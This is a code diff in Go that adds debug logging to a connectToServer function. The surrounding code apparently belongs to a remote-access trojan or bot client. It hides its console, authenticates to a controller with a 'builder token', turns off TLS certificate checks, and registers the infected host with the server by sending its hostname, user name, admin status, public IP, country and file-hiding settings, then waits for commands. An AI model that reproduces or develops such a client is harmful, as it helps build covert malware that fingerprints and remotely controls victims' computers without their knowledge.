@@ -11,14 +11,18 @@ func waitForNetwork() {
 }
 
 func connectToServer() {
+	log.Println("[connect] starting connectToServer")
 	hideConsole()
 
 	if offlineModeEnabled {
+		log.Println("[connect] offline mode enabled, waiting for network")
 		waitForNetwork()
 	}
 
 	serverHost := getServerHost()
+	log.Println("[connect] serverHost=", serverHost)
 	if strings.TrimSpace(serverHost) == "" {
+		log.Println("[connect] ERROR: empty serverHost, exiting")
 		return
 	}
 
@@ -26,17 +30,21 @@ func connectToServer() {
 	if wsScheme == "" {
 		wsScheme = "ws"
 	}
+	log.Println("[connect] wsScheme=", wsScheme)
 
 	wsPath := getWsPath()
 	if wsPath == "" {
 		wsPath = "/ws"
 	}
+	log.Println("[connect] wsPath=", wsPath)
 
 	u := url.URL{Scheme: wsScheme, Host: serverHost, Path: wsPath}
+	log.Println("[connect] wsURL=", u.String())
 
 	header := http.Header{}
 	if token := getBuilderToken(); len(token) != 0 {
 		header.Add(getBuilderTokenHeader(), string(token))
+		log.Println("[connect] added builder token, len=", len(token))
 	}
 
 	dialer := &websocket.Dialer{
@@ -44,13 +52,17 @@ func connectToServer() {
 	}
 	if wsScheme == "wss" {
 		dialer.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+		log.Println("[connect] using wss with InsecureSkipVerify")
 	}
 
+	log.Println("[connect] dialing...")
 	conn, _, err := dialer.Dial(u.String(), header)
 	if err != nil {
+		log.Println("[connect] ERROR: dial failed, err=", err)
 		return
 	}
 	defer conn.Close()
+	log.Println("[connect] connected successfully!")
 
 	hostname, _ := os.Hostname()
 	userName := getUserName()
@@ -60,6 +72,11 @@ func connectToServer() {
 	adminFlag := isAdmin()
 	publicIP := getPublicIP()
 	country := getCountryByIP(publicIP)
+
+	log.Println("[connect] preparing registerMsg id=", id)
+	log.Println("[connect] hostname=", hostname, "user=", userName, "owner=", ownerName)
+	log.Println("[connect] buildID=", buildID, "admin=", adminFlag)
+	log.Println("[connect] publicIP=", publicIP, "country=", country)
 
 	registerMsg := map[string]interface{}{
 		"type":                "register",
@@ -84,9 +101,12 @@ func connectToServer() {
 		"hideFilesEnabled":    hideFilesEnabled,
 	}
 
+	log.Println("[connect] sending register message...")
 	if err := wsWriteJSON(conn, registerMsg); err != nil {
+		log.Println("[connect] ERROR: failed to send register, err=", err)
 		return
 	}
+	log.Println("[connect] register message sent successfully")
 
 	go func() {
 		for {
